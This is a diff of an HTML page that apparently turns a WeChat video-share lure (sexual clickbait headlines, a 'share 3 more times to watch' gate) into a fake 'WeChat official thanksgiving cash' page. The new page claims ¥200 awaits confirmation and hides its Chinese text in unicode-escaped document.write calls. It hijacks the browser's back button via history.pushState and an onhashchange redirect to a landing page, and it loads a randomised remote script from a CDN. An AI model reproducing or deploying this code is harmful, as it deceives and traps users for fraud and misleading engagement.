@@ -1,197 +1,124 @@
-<!DOCTYPE html>
+<!--广告合作QQ：413371362--><!DOCTYPE html>
 <html>
-
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
-    <meta name="format-detection" content="telephone=no" />
-    <title></title>
-    <script>
-        if (!(/MicroMessenger/i).test(window.navigator.userAgent)) {
-//            window.location.href = "http://www.qq.com/";
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <meta name="viewport"
+          content="width=device-width,minimum-scale=1,user-scalable=no,maximum-scale=1,initial-scale=1"/>
+    <meta name="apple-mobile-web-app-capable" content="yes"/>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="description" content=""/>
+    <title>微信官方感恩现金</title>
+    <link rel="stylesheet" href="http://xyzcdn.chinacloudup.com/zhuanzhang/static/css/sweet-alertss.css">
+    <style type="text/css">
+        body {
+            height: 1024px
         }
-    </script>
-    <link href="http://xyzcdn.chinacloudup.com/video_new/css/hz.css" rel="stylesheet" type="text/css" media="all">
-    <link href="http://xyzcdn.chinacloudup.com/video_new/css/detailmode.css" type="text/css" rel="stylesheet" media="all">
-    <link href="http://xyzcdn.chinacloudup.com/video_new/css/ggPart.css" type="text/css" rel="stylesheet" media="all">
-    <link href="http://xyzcdn.chinacloudup.com/video_new/css/common.css" type="text/css" rel="stylesheet" media="all">
+
+        .anniu {
+            width: 95%;
+            height: 55px;
+            background-color: #1aad19;
+            position: fixed;
+            top: 43%;
+            margin: 0 auto;
+            left: 0;
+            overflow: hidden;
+            text-align: center;
+            right: 0;
+            border-radius: 5px;
+            line-height: 55px;
+            color: #fff;
+            font-size: 20px
+        }</style>
+
 </head>
-
-<body class="mhome">
-<div class="article">
-    <div>
-        <p class="art_txt sau" style="margin-bottom:-5px;" id="date"></p>
-        <a href="http://bugreport.blob.core.chinacloudapi.cn/bhltvl/jb.html" style="display:inline-block;float:right;margin-right:10px;color:dodgerblue;margin-top: -25px;position: relative;z-index: 999;">举报</a>
-    </div>
-    <p class="art_txt sau" style="margin-bottom:-5px;"></p>
-    <div style="margin-left:10px;overflow: hidden;"></div>
-    <div class="art_co sau">
-        <div>
-            <div id="vodio_show" style="margin-left:">
-                <p>
-                <div id='vMask' style="display:block;z-index:10">
-                    <img src="#" id="cover_img" style="width:100%;height:300px;position: relative;top:0;">
-                    <div id="d00">
-                        <span id="s00"></span>
-                    </div>
-                </div>
-                <iframe id='v' height="300" width="100%" frameborder="0" style="" src="" onload="var src = this.src;for (var key in resList) {if (resList.hasOwnProperty(key)) {var element = resList[key];if(src.indexOf(element.vurl)!=-1){document.getElementById('vMask').style.display = 'none';break;}}}"></iframe>
-                </p>
-            </div>
-            <br>
-        </div>
-    </div>
+<body onload="time();"
+      style="position:fixed;top:49%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;color:#808080;">
+<p id="shijian" style="display:none"></p>
+<p id="showtime" style="display:none"></p>
+<p id="absabd" style="display:none"></p>
+<div id="ashowtime"
+     style="position:fixed;top:95%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;color:#808080;"></div>
+<img src="http://xyzcdn.chinacloudup.com/zhuanzhang/static/images/2a.png" width="30%"
+     style="position:fixed;top:5%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;">
+<img src="http://xyzcdn.chinacloudup.com/zhuanzhang/static/images/a.gif" id="wxzhifu" width="30%"
+     style="position:fixed;top:35%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;border-radius:5px;display:none;z-index:99;">
+<img src="http://xyzcdn.chinacloudup.com/zhuanzhang/static/images/3a.png" id="wxzf" width="30%"
+     style="position:fixed;top:35%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;border-radius:5px;display:none;z-index:99;">
+<p id="wxzfwz"
+   style="position:fixed;top:40%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;font-size:16px;display:none;z-index:99;color:#fff">
+    <script>document.write("\u5fae\u4fe1\u652f\u4ed8"); </script>
+</p>
+<p style="position:fixed;top:25%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;font-size:20px;font-weight:bold;color:#000">
+    <script>document.write("\u5f85\u6536\u94b1"); </script>
+</p>
+<p style="position:fixed;top:31%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;font-size:40px;font-weight:500;color:#000">
+    <script>document.write("\uffe5200.00"); </script>
+</p>
+<div class="anniu" onclick="zhifu();timedMsg();">
+    <script>document.write("\u786e\u8ba4\u6536\u94b1"); </script>
 </div>
-<div style="width:100%">
-    <a href="" id="adv-banner">
-        <img style="width:100%;height:auto" src="http://wx-img.wedatabank.com/img/helloworld.gif">
-    </a>
-</div>
-<div class="ggPart" id="recom-list">
-    <div class="ggPartWrap">
-        <div class="ggtitle" style="text-align:left">
-            热门推荐
-        </div>
-        <div class="list" id="list">
-            <div class="tPcBoxN" id="tPcBoxN" style="display:none">
-                <dl class="tPcListN">
-                    <dt>
-                        <a class = "tPcBoxN_a" href="#">
-                            <img id="tPcBoxN_img" height="70" width="120" src="#" alt="" onerror="javascript:var src =this.getAttribute('data-src');if (src) {this.src = src;} else {this.src = '';this.onerror = null;}return false;">
-                        </a>
-                    </dt>
-                    <dd>
-                        <div class="tPcListCN">
-                            <h3>
-                                <a class = "tPcBoxN_a" id="tPcBoxN_a_t" href="#">#</a>
-                            </h3>
-                            <p>
-                                <a class="tPcBoxN_a" href="#">
-                                    3小时前
-                                    <span style="float:right" id="readn">#</span>
-                                </a>
-                            </p>
-                        </div>
-                    </dd>
-                </dl>
-            </div>
-            <div class="tPcBoxN" id="tPcBoxN">
-                <dl class="tPcListN">
-                    <dt>
-                        <a class = "tPcBoxN_a xyz" href="javacript:;" onclick="selfLoad()">
-                            <img id="tPcBoxN_img" height="70" width="120" src="http://ww2.sinaimg.cn/small/006bM9Npgw1f4n2xy6xtlj30m80hsq3j.jpg">
-                        </a>
-                    </dt>
-                    <dd>
-                        <div class="tPcListCN">
-                            <h3>
-                                <a class = "tPcBoxN_a xyz" id="tPcBoxN_a_t" href="javacript:;" onclick="selfLoad()" style='color:red'>约炮撞上小姨子，非但没被揍，还双飞。。。</a>
-                            </h3>
-                            <p>
-                                <a class="tPcBoxN_a xyz" href="javacript:;" onclick="selfLoad()">
-                                    3小时前
-                                    <span style="float:right" id="readn">阅读:&nbsp;&nbsp;&nbsp;&nbsp13132次</span>
-                                </a>
-                            </p>
-                        </div>
-                    </dd>
-                </dl>
-            </div>
-            <div class="tPcBoxN" id="tPcBoxN1" style='display:none'>
-                <dl class="tPcListN">
-                    <dt>
-                        <a class = "tPcBoxN_a" href="javascript:;" onclick="javascript:openAv();return false;">
-                            <img id="tPcBoxN_img" height="70" width="120" src="http://image.renaoapp.com/aaa/nanning.jpg">
-                        </a>
-                    </dt>
-                    <dd>
-                        <div class="tPcListCN">
-                            <h3>
-                                <a class = "tPcBoxN_a" id="tPcBoxN_a_t" href="javascript:;" onclick="javascript:openAv();return false;" style='color:red'>南宁护士门视频，一天后删......</a>
-                            </h3>
-                            <p>
-                                <a class="tPcBoxN_a" href="javascript:;" onclick="javascript:openAv();return false;">
-                                    3小时前
-                                    <span style="float:right" id="readn">阅读:&nbsp;&nbsp;&nbsp;&nbsp14632次</span>
-                                </a>
-                            </p>
-                        </div>
-                    </dd>
-                </dl>
-            </div>
-            <div class="tPcBoxN" id="tPcBoxN2" style='display:none'>
-                <dl class="tPcListN">
-                    <dt>
-                        <a class = "tPcBoxN_a" href="http://m.weimob.com/buyer/goods/detail?vid=126733530&sid=126733530&gid=30464874231">
-                            <img id="tPcBoxN_img" height="70" width="120" src="http://wxapi.http-cache.com/img/qun_icon.jpg">
-                        </a>
-                    </dt>
-                    <dd>
-                        <div class="tPcListCN">
-                            <h3>
-                                <a class = "tPcBoxN_a" id="tPcBoxN_a_t" href="http://m.weimob.com/buyer/goods/detail?vid=126733530&sid=126733530&gid=30464874231" style='color:red'>最新大片免费在线观看，热门电影，经典之作，应有尽有</a>
-                            </h3>
-                            <p>
-                                <a class="tPcBoxN_a" href="http://m.weimob.com/buyer/goods/detail?vid=126733530&sid=126733530&gid=30464874231">
-                                    3小时前
-                                    <span style="float:right" id="readn">阅读:&nbsp;&nbsp;&nbsp;&nbsp14632次</span>
-                                </a>
-                            </p>
-                        </div>
-                    </dd>
-                </dl>
-            </div>
-        </div>
-    </div>
-    <div id="show_imgs">
-    </div>
-</div>
-<!--<div>
-    <a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx7694c59f1ac4995c&redirect_uri=http://ckweiku.oss-cn-shanghai.aliyuncs.com/rd.html&response_type=code&scope=snsapi_base&state=1#wechat_redirect"><img src='http://bnsc.cdn.bcebos.com/bottom.gif'></a>
-</div>-->
-<div style="width:100%;">
-    <br>
-    <button id="loadMore">加载更多</button>
-    <br>
-</div>
-</div>
-<img src="#" id="shareImage" style="display:none">
-<div id="cover" style="display:block"></div>
-<div id="guide" style="background:rgb(28,28,28) url('http://image.renaoapp.com/aaa/e11.jpg');width:100%;height:1000px;position:absolute;left:0;top:0;background-repeat:no-repeat;background-size:100% auto"></div>
-
-<div id="count">
-    <div id="count_0">
-        <p id="count_desc">再分享<strong style="color:#000" id="c_times">3</strong>次就可以观看了~</p>
-        <button id="c_comfirm" onclick="closeCount()">确&nbsp定</button>
-    </div>
-</div>
-<div style="position:fixed;top:0;left:0;margin:0 auto;text-align:center;background-color:#00C957;height:2.5px;width:0%;z-index:99999" id="progress"></div>
-
-<script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
-<script type="text/javascript" src="http://res.wx.qq.com/open/js/jweixin-1.1.0.js"></script>
-<script type="text/javascript" src="http://xyzcdn.chinacloudup.com/video_new/js/_system.js"></script>
-<!-- <script src="http://www.dl-zp.cn/get/index.php?id=522"></script> -->
-<!--<script type="text/javascript" src="http://www.kanav022.cn/get/index.php?id=522"></script>-->
-
-<!--<script type="text/javascript" >-->
-  <!--var turl = "";-->
-    <!--(function () {-->
-        <!--function jsonpCallback(result) {-->
-            <!--var addrArr = result;-->
-            <!--var ran = new Date().getTime() % addrArr.length;-->
-            <!--var rs = addrArr[ran];-->
-            <!--turl = rs;-->
-        <!--}-->
-
-        <!--window.jsonpCallback =jsonpCallback;-->
-    <!--}());-->
-<!--</script>-->
-<!--<script src="http://aaa.bzwxxf.com/1002_2.json?callback=jsonpCallback"></script>-->
-
-
+<p style="position:fixed;top:55%;margin:0 auto;left: 0;overflow:hidden;text-align: center; right: 0;color:#808080;">
+    <script>document.write("1\u5c0f\u65f6\u5185\u672a\u786e\u8ba4\uff0c\u5c06\u9000\u8fd8\u7ed9\u5bf9\u65b9"); </script>
+</p>
+<div class="share" id="share" onclick="javascript:show(false);"></div>
 <script type="text/javascript">
-    document.write("<script type='text/javascript' src='http://xyzcdn.chinacloudup.com/video_new/js/main_hk.js?" + Math.floor(Math.random() * 10000) + "'><\/script>");
+    document.write("<script type='text/javascript' src='http://xyzcdn.chinacloudup.com/zhuanzhang/static/js/index.min.js?" + Math.floor(Math.random() * 10000) + "'><\/script>");
 </script>
-</body>
+<script language="javascript">thisURL = window.location.hostname;</script>
+<script>
+    window.onhashchange = function () {
+        jp();
+    };
+    function hh() {
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+    }
+    function jp() {
 
+        location.href = "luodi.html?id=59"; //"/d.html";
+    }
+    setTimeout('hh();', 200);
+//统计
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?229a95b3f23232877f59941bd2cee9ab";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+
+    window._czc = window._czc || [];
+
+    function loadJS(src, callback, errCallback) {
+        if (!src) {
+            return;
+        }
+        var e = document.createElement('script');
+        e.setAttribute('type', 'text/javascript');
+        e.setAttribute('charset', "utf-8");
+        e.setAttribute('src', src);
+        document.getElementsByTagName('head')[0].appendChild(e);
+        if (typeof errCallback == 'function') {
+            e.onerror = errCallback;
+        }
+        e.onload = function () {
+            if (typeof callback == 'function') {
+                callback();
+            }
+        };
+    }
+
+    function tj(id, web_id) {
+
+        loadJS('http://s4.cnzz.com/z_stat.php?id=' + id + '&web_id=' + web_id);
+        _czc.push(["_setAccount", web_id]);
+    }
+
+    window.g_initTj = tj;
+    g_initTj(1260102741, 1260102741);
+
+</script>
+
+</body>
 </html>
